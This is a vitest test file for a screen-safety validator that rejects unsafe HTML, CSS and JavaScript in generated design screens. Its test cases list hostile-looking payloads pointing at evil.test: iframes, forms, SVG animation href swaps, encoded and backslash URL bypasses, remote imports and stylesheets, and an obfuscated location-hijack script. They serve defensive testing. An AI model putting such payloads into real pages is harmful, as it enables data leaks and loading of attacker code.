import { describe, expect, it } from "vitest";
import type { DesignScreenPayload } from "./screen-payload";
import { findScreenSafetyViolations } from "./screen-safety";

function payload(overrides: Partial<DesignScreenPayload> = {}): DesignScreenPayload {
  return {
    markup: "<section><p>Hello</p></section>",
    styles: "p { color: var(--meld-color-text); }",
    script: null,
    actions: [],
    ...overrides,
  } as DesignScreenPayload;
}

function rules(input: DesignScreenPayload): string[] {
  return findScreenSafetyViolations(input).map((finding) => finding.rule);
}

describe("findScreenSafetyViolations", () => {
  it("passes a clean screen", () => {
    expect(findScreenSafetyViolations(payload())).toEqual([]);
  });

  it.each([
    ["<base href='https://evil.test/'>", "forbidden-element"],
    ["<meta http-equiv='refresh' content='0'>", "forbidden-element"],
    ["<link rel='stylesheet' href='https://evil.test/a.css'>", "forbidden-element"],
    ["<iframe src='https://evil.test'></iframe>", "forbidden-element"],
    ["<object data='https://evil.test'></object>", "forbidden-element"],
    ["<embed src='https://evil.test'>", "forbidden-element"],
    ["<form action='https://evil.test'></form>", "forbidden-element"],
    ["<script>alert(1)</script>", "forbidden-element"],
  ])("rejects %s", (markup, rule) => {
    expect(rules(payload({ markup }))).toContain(rule);
  });

  it.each([
    ["set", '<svg><set attributeName="href" to="https://evil.test" /></svg>'],
    [
      "animate",
      '<svg><animate attributeName="href" values="#safe;https://evil.test" /></svg>',
    ],
    [
      "animateColor",
      '<svg><animateColor attributeName="fill" values="red;blue" /></svg>',
    ],
    [
      "animateMotion",
      '<svg><animateMotion path="M 0 0 L 10 10" /></svg>',
    ],
    [
      "animateTransform",
      '<svg><animateTransform attributeName="transform" type="translate" /></svg>',
    ],
    ["discard", '<svg><discard begin="0s" /></svg>'],
    ["mpath", '<svg><mpath /></svg>'],
  ])("rejects SVG SMIL element %s", (_element, markup) => {
    expect(rules(payload({ markup }))).toContain("forbidden-element");
  });

  it("rejects a remote URL in an attribute", () => {
    expect(rules(payload({ markup: "<img src='https://evil.test/a.png'>" }))).toContain(
      "remote-url",
    );
  });

  it("rejects a single-slash special-scheme URL", () => {
    expect(
      rules(payload({ markup: "<img src='https:/evil.test/a.png'>" })),
    ).toContain("remote-url");
  });

  it("rejects a protocol-relative URL", () => {
    expect(rules(payload({ markup: "<img src='//evil.test/a.png'>" }))).toContain(
      "remote-url",
    );
  });

  it("allows a data: image", () => {
    expect(
      findScreenSafetyViolations(payload({ markup: "<img src='data:image/png;base64,AA=='>" })),
    ).toEqual([]);
  });

  it("rejects an entity-encoded remote URL after HTML parsing", () => {
    expect(
      rules(
        payload({
          markup: '<a href="http:&#47;&#47;evil.test/leak">Leave</a>',
        }),
      ),
    ).toContain("remote-url");
  });

  it.each(["/relative", "#fragment"])(
    "rejects navigational href %s",
    (href) => {
      expect(
        rules(payload({ markup: `<a href="${href}">Leave</a>` })),
      ).toContain("remote-url");
    },
  );

  it.each([
    ['<form action="/submit"></form>', "action"],
    ['<button formaction="/submit">Send</button>', "formaction"],
    ['<a ping="/audit">Leave</a>', "ping"],
  ])("rejects navigation through %s", (markup, attribute) => {
    const findings = findScreenSafetyViolations(payload({ markup }));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          rule: "remote-url",
          detail: expect.stringContaining(attribute),
        }),
      ]),
    );
  });

  it("rejects a non-data resource URL", () => {
    expect(rules(payload({ markup: '<img src="/asset.png">' }))).toContain(
      "remote-url",
    );
  });

  it("rejects decoded remote URLs in style attributes", () => {
    expect(
      rules(
        payload({
          markup:
            '<p style="background:url(http:&#47;&#47;evil.test/a.png)">x</p>',
        }),
      ),
    ).toContain("remote-url");
  });

  it("rejects a remote url() in styles", () => {
    expect(rules(payload({ styles: "body { background: url(https://evil.test/x.png); }" }))).toContain(
      "remote-url",
    );
  });

  it("rejects @import in styles", () => {
    expect(rules(payload({ styles: "@import url(https://evil.test/x.css);" }))).toContain(
      "remote-url",
    );
  });

  it.each([
    ["import('https://evil.test/x.js')", "module-import"],
    ["importScripts('/x.js')", "module-import"],
    ["new Worker('/w.js')", "worker"],
    ["new SharedWorker('/w.js')", "worker"],
    ["navigator.serviceWorker.register('/sw.js')", "worker"],
    ["top.location = 'https://evil.test'", "navigation-api"],
    ["window.location.replace('https://evil.test')", "navigation-api"],
    ["window.open('https://evil.test')", "navigation-api"],
  ])("rejects script using %s", (script, rule) => {
    expect(rules(payload({ script }))).toContain(rule);
  });

  it("rejects every nonempty script, including computed navigation", () => {
    const script =
      'window["loc" + "ation"]["hr" + "ef"] = atob("aHR0cHM6Ly9ldmlsLnRlc3Q=")';

    expect(rules(payload({ script }))).toContain("script-execution");
  });

  it("reports every violation rather than stopping at the first", () => {
    const findings = findScreenSafetyViolations(
      payload({ markup: "<iframe></iframe><img src='https://evil.test/a.png'>" }),
    );
    expect(findings.map((finding) => finding.rule).sort()).toEqual([
      "forbidden-element",
      "remote-url",
    ]);
  });

  it("names the offending construct in the detail", () => {
    const [finding] = findScreenSafetyViolations(payload({ markup: "<iframe></iframe>" }));
    expect(finding.detail).toContain("iframe");
  });

  // Fix 1: REMOTE_URL accepts backslashes in addition to forward slashes
  it("rejects backslash URLs in markup", () => {
    expect(
      rules(payload({ markup: String.raw`<img src="\\evil.test/a.png">` })),
    ).toContain("remote-url");
  });

  it("rejects mixed slash and backslash URLs", () => {
    expect(
      rules(payload({ markup: String.raw`<img src="https:\\evil.test/a.png">` })),
    ).toContain("remote-url");
  });

  it("allows data URLs with // in the base64 content", () => {
    expect(
      findScreenSafetyViolations(payload({ markup: "<img src='data:image/png;base64,AB//CD=='>" })),
    ).toEqual([]);
  });

  // Fix 2: module-import detects static imports
  it("rejects static import statements", () => {
    expect(
      rules(payload({ script: 'import evil from "https://evil.test/mod.js"' })),
    ).toContain("module-import");
  });

  it("rejects import side-effects", () => {
    expect(rules(payload({ script: 'import "https://evil.test/side.js"' }))).toContain(
      "module-import",
    );
  });

  it("classifies otherwise benign generated JavaScript as script execution", () => {
    expect(rules(payload({ script: "const x = 'important';" }))).toEqual([
      "script-execution",
    ]);
  });

  // Fix 3: navigation-api with bracket notation
  it("rejects window bracket location assignment", () => {
    expect(
      rules(payload({ script: 'window["location"] = "https://evil.test"' })),
    ).toContain("navigation-api");
  });

  it("rejects window bracket open call", () => {
    expect(
      rules(payload({ script: 'window["open"]("https://evil.test")' })),
    ).toContain("navigation-api");
  });

  it("does not misclassify modal.open() as a navigation API", () => {
    expect(rules(payload({ script: "modal.open();" }))).toEqual([
      "script-execution",
    ]);
  });

  it("does not misclassify this.open() as a navigation API", () => {
    expect(rules(payload({ script: "this.open(true);" }))).toEqual([
      "script-execution",
    ]);
  });

  // Fix 4: detail contains the actual matched construct, not regex source
  it("includes the actual construct in worker detail, not regex", () => {
    const findings = findScreenSafetyViolations(payload({ script: "new Worker('/w.js')" }));
    const [finding] = findings.filter((f) => f.rule === "worker");
    expect(finding.detail).toContain("Worker");
    expect(finding.detail).not.toMatch(/\\b/);
  });
});
